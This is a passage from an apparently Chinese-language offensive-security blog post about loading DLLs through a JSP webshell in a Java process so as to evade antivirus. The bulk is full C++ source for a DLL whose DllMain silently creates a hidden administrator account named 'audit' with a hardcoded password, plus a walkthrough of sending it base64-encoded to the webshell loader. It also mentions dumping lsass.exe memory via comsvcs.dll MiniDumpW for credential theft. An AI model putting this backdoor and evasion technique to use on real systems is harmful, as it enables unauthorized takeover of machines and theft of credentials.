</span></span><span style=display:flex><span>              RuntimeLoad(file);
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>catch</span> (Exception e){
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(e.<span style=color:#a6e22e>toString</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span>jsp:scriptlet<span style=color:#f92672>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=0x04-windows-动态链接库>0x04 Windows 动态链接库</h2><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。 在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。在Windows平台下，我们使用的应用程序中的功能其实大多都很相似，窗口调用窗口的模块，分配内存调用内存管理的模块，文件操作调用IO模块，这些模块在Windows里的具体表现就是DLL文件。</p><p>在之前的文章中有简单总结过Dll的一些知识，这里就不做详细介绍了：</p><ul><li><a href=https://payloads.online/archivers/2019-10-02/1/>DllMain与rundll32详解</a></li><li><a href=https://payloads.online/archivers/2018-12-22/1/#0x02-dll%E6%98%AF%E4%BB%80%E4%B9%88>DLL Hijacking & COM Hijacking ByPass UAC - 议题解读</a></li></ul><p>在Windows操作系统中，每一个进程加载一个DLL都会默认执行DLLMain函数，利用这个加载的特性我们可以在Java.exe进程中做一些敏感操作，并且这个进程是白名单、签名的。</p><h2 id=0x05-实战绕过数字杀毒添加用户>0x05 实战绕过数字杀毒添加用户</h2><p>前提条件：</p><ul><li>有一个管理员权限的Webshell</li><li>编写一个添加用户的DLL</li></ul><p>首先上传之前写好的专门用于加载DLL的JSP文件，然后编写一个添加用户的DLL文件：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// dllmain.cpp : 定义 DLL 应用程序的入口点。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;pch.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;lmaccess.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;lmerr.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Tchar.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib,&#34;netapi32.lib&#34;)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>DWORD <span style=color:#a6e22e>CreateAdminUserInternal</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	NET_API_STATUS rc;
</span></span><span style=display:flex><span>	BOOL b;
</span></span><span style=display:flex><span>	DWORD dw;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	USER_INFO_1 ud;
</span></span><span style=display:flex><span>	LOCALGROUP_MEMBERS_INFO_0 gd;
</span></span><span style=display:flex><span>	SID_NAME_USE snu;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	DWORD cbSid <span style=color:#f92672>=</span> <span style=color:#ae81ff>256</span>;	<span style=color:#75715e>// 256 bytes should be enough for everybody :)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	BYTE Sid[<span style=color:#ae81ff>256</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	DWORD cbDomain <span style=color:#f92672>=</span> <span style=color:#ae81ff>256</span> <span style=color:#f92672>/</span> <span style=color:#66d9ef>sizeof</span>(TCHAR);
</span></span><span style=display:flex><span>	TCHAR Domain[<span style=color:#ae81ff>256</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// Create user
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// http://msdn.microsoft.com/en-us/library/aa370649%28v=VS.85%29.aspx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>	memset(<span style=color:#f92672>&amp;</span>ud, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(ud));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	ud.usri1_name <span style=color:#f92672>=</span> (LPWSTR)TEXT(<span style=color:#e6db74>&#34;audit&#34;</span>);						<span style=color:#75715e>// username
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ud.usri1_password <span style=color:#f92672>=</span> (LPWSTR)TEXT(<span style=color:#e6db74>&#34;Test123456789!&#34;</span>);				<span style=color:#75715e>// password
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ud.usri1_priv <span style=color:#f92672>=</span> USER_PRIV_USER;					<span style=color:#75715e>// cannot set USER_PRIV_ADMIN on creation
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ud.usri1_flags <span style=color:#f92672>=</span> UF_SCRIPT <span style=color:#f92672>|</span> UF_NORMAL_ACCOUNT;	<span style=color:#75715e>// must be set
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ud.usri1_script_path <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	rc <span style=color:#f92672>=</span> NetUserAdd(
</span></span><span style=display:flex><span>		NULL,			<span style=color:#75715e>// local server
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#ae81ff>1</span>,				<span style=color:#75715e>// information level
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		(LPBYTE)<span style=color:#f92672>&amp;</span>ud,
</span></span><span style=display:flex><span>		NULL			<span style=color:#75715e>// error value
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (rc <span style=color:#f92672>!=</span> NERR_Success) {
</span></span><span style=display:flex><span>		_tprintf(_T(<span style=color:#e6db74>&#34;NetUserAdd FAIL %d 0x%08x</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>), rc, rc);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> rc;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// Get user SID
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// http://msdn.microsoft.com/en-us/library/aa379159(v=vs.85).aspx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>	b <span style=color:#f92672>=</span> LookupAccountName(
</span></span><span style=display:flex><span>		NULL,			<span style=color:#75715e>// local server
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		_T(<span style=color:#e6db74>&#34;audit&#34;</span>),	<span style=color:#75715e>// account name
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		Sid,			<span style=color:#75715e>// SID
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#f92672>&amp;</span>cbSid,			<span style=color:#75715e>// SID size
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		Domain,			<span style=color:#75715e>// Domain
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#f92672>&amp;</span>cbDomain,		<span style=color:#75715e>// Domain size
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#f92672>&amp;</span>snu			<span style=color:#75715e>// SID_NAME_USE (enum)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>b) {
</span></span><span style=display:flex><span>		dw <span style=color:#f92672>=</span> GetLastError();
</span></span><span style=display:flex><span>		_tprintf(_T(<span style=color:#e6db74>&#34;LookupAccountName FAIL %d 0x%08x</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>), dw, dw);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> dw;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// Add user to &#34;Administrators&#34; local group
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// http://msdn.microsoft.com/en-us/library/aa370436%28v=VS.85%29.aspx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>	memset(<span style=color:#f92672>&amp;</span>gd, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(gd));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	gd.lgrmi0_sid <span style=color:#f92672>=</span> (PSID)Sid;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	rc <span style=color:#f92672>=</span> NetLocalGroupAddMembers(
</span></span><span style=display:flex><span>		NULL,					<span style=color:#75715e>// local server
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		_T(<span style=color:#e6db74>&#34;Administrators&#34;</span>),
</span></span><span style=display:flex><span>		<span style=color:#ae81ff>0</span>,						<span style=color:#75715e>// information level
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		(LPBYTE)<span style=color:#f92672>&amp;</span>gd,
</span></span><span style=display:flex><span>		<span style=color:#ae81ff>1</span>						<span style=color:#75715e>// only one entry
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (rc <span style=color:#f92672>!=</span> NERR_Success) {
</span></span><span style=display:flex><span>		_tprintf(_T(<span style=color:#e6db74>&#34;NetLocalGroupAddMembers FAIL %d 0x%08x</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>), rc, rc);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> rc;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BOOL APIENTRY <span style=color:#a6e22e>DllMain</span>( HMODULE hModule,
</span></span><span style=display:flex><span>                       DWORD  ul_reason_for_call,
</span></span><span style=display:flex><span>                       LPVOID lpReserved
</span></span><span style=display:flex><span>                     )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (ul_reason_for_call)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
</span></span><span style=display:flex><span>		CreateAdminUserInternal();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>在DllMain函数中调用CreateAdminUserInternal实现添加管理员用户audit。将dll文件进行base64编码，发送到加载动态链接库的jsp页面，就可以绕过数字杀毒添加用户了：</p><p><img src=https://images.payloads.online/2022-08-11-22-05-16.png alt></p><p>发送之前：</p><p><img src=https://images.payloads.online/2022-08-11-22-05-42.png alt></p><p>发送之后：</p><p><img src=https://images.payloads.online/2022-08-11-22-05-54.png alt></p><p><img src=https://images.payloads.online/2022-08-11-22-05-59.png alt></p><p>至此管理员用户添加成功。</p><p>当DLL的编译架构与Java进程的位数不同，加载会失败，抛出：<code>Can't load AMD 64-bit .dll on a IA 32-bit platform。</code></p><p><img src=https://images.payloads.online/2022-08-11-22-06-15.png alt></p><p>这个问题只需要调整DLL的编译架构就行：</p><p><img src=https://images.payloads.online/2022-08-11-22-06-31.png alt></p><p>同样的我们还可以调用comsvcs.dll导出的MiniDumpW转储lsass.exe进程的内存。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
